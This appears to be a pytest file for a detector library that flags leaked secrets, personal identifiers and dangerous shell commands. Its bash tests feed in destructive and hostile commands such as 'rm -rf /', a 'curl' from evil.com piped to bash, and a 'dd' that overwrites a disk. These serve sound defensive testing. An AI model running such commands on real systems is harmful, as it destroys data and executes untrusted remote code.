"""Tests for lib.patterns — reusable regex patterns for secrets, PII, bash safety."""
from __future__ import annotations

import pytest

from lib.patterns import (
    BashSafetyPatterns,
    Match,
    PatternSet,
    PIIPatterns,
    SecretPatterns,
)


class TestPatternSet:
    """PatternSet base behavior."""

    def test_frozen(self) -> None:
        ps = PatternSet(name="test", patterns=[], whitelist=[])
        with pytest.raises(AttributeError):
            ps.name = "changed"  # type: ignore[misc]

    def test_detect_returns_list_of_match(self) -> None:
        import re

        ps = PatternSet(
            name="test",
            patterns=[re.compile(r"secret_\w+")],
            whitelist=[],
        )
        results = ps.detect("found secret_key here")
        assert len(results) == 1
        assert isinstance(results[0], Match)
        assert results[0].matched_text == "secret_key"

    def test_whitelist_excludes_matches(self) -> None:
        import re

        ps = PatternSet(
            name="test",
            patterns=[re.compile(r"key_\w+")],
            whitelist=[re.compile(r"key_public")],
        )
        results = ps.detect("key_private and key_public here")
        assert len(results) == 1
        assert results[0].matched_text == "key_private"

    def test_no_match_returns_empty(self) -> None:
        import re

        ps = PatternSet(
            name="test",
            patterns=[re.compile(r"xyz_\d+")],
            whitelist=[],
        )
        assert ps.detect("nothing here") == []


class TestSecretPatterns:
    """SecretPatterns detects API keys, tokens, etc."""

    @pytest.fixture
    def secrets(self) -> PatternSet:
        return SecretPatterns.create()

    def test_detects_generic_api_key(self, secrets: PatternSet) -> None:
        text = 'api_key = "sk-1234567890abcdef"'
        matches = secrets.detect(text)
        assert len(matches) >= 1

    def test_detects_aws_access_key(self, secrets: PatternSet) -> None:
        text = "AKIAIOSFODNN7EXAMPLE"
        matches = secrets.detect(text)
        assert len(matches) >= 1

    def test_detects_github_pat(self, secrets: PatternSet) -> None:
        text = "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789"
        matches = secrets.detect(text)
        assert len(matches) >= 1

    def test_detects_private_key_header(self, secrets: PatternSet) -> None:
        text = "-----BEGIN RSA PRIVATE KEY-----"
        matches = secrets.detect(text)
        assert len(matches) >= 1

    def test_no_false_positive_on_normal_text(self, secrets: PatternSet) -> None:
        text = "This is a normal sentence about programming."
        matches = secrets.detect(text)
        assert len(matches) == 0

    def test_detects_openai_key(self, secrets: PatternSet) -> None:
        text = "sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx"
        matches = secrets.detect(text)
        assert len(matches) >= 1


class TestPIIPatterns:
    """PIIPatterns with country-specific detection."""

    def test_br_detects_cpf(self) -> None:
        pii = PIIPatterns.for_country("BR")
        matches = pii.detect("CPF: 123.456.789-09")
        assert len(matches) >= 1

    def test_br_detects_cnpj(self) -> None:
        pii = PIIPatterns.for_country("BR")
        matches = pii.detect("CNPJ: 12.345.678/0001-95")
        assert len(matches) >= 1

    def test_us_detects_ssn(self) -> None:
        pii = PIIPatterns.for_country("US")
        matches = pii.detect("SSN: 123-45-6789")
        assert len(matches) >= 1

    def test_eu_detects_email(self) -> None:
        pii = PIIPatterns.for_country("EU")
        matches = pii.detect("email: user@example.com")
        assert len(matches) >= 1

    def test_unknown_country_returns_empty_patterns(self) -> None:
        pii = PIIPatterns.for_country("XX")
        assert pii.detect("anything") == []

    def test_no_false_positive_on_normal_numbers(self) -> None:
        pii = PIIPatterns.for_country("BR")
        matches = pii.detect("Order #12345 shipped today.")
        assert len(matches) == 0


class TestBashSafetyPatterns:
    """BashSafetyPatterns detects dangerous shell commands."""

    @pytest.fixture
    def bash(self) -> PatternSet:
        return BashSafetyPatterns.create()

    def test_detects_rm_rf_root(self, bash: PatternSet) -> None:
        matches = bash.detect("rm -rf /")
        assert len(matches) >= 1

    def test_detects_chmod_777(self, bash: PatternSet) -> None:
        matches = bash.detect("chmod 777 /etc/passwd")
        assert len(matches) >= 1

    def test_detects_curl_pipe_bash(self, bash: PatternSet) -> None:
        matches = bash.detect("curl http://evil.com/script.sh | bash")
        assert len(matches) >= 1

    def test_no_false_positive_on_safe_commands(self, bash: PatternSet) -> None:
        matches = bash.detect("ls -la /home/user")
        assert len(matches) == 0

    def test_detects_dd_of_dev(self, bash: PatternSet) -> None:
        matches = bash.detect("dd if=/dev/zero of=/dev/sda")
        assert len(matches) >= 1
